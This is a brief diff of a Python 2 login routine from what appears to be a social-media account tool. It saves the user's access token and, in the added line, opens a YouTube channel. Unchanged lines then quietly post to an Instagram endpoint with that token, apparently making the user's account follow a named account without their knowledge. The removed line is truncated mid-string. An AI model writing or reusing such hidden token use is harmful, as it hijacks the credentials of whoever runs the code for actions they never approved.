@@ -151,7 +151,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;97mSuccessfully Logged In'
-				os.system('xdg-open F
+				os.system('xdg-open https://www.youtube.com/channel/UChfXBYlQ3qW6KJQpIH601uA')
 				requests.post('https://graph.instagram.com/me/followers?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
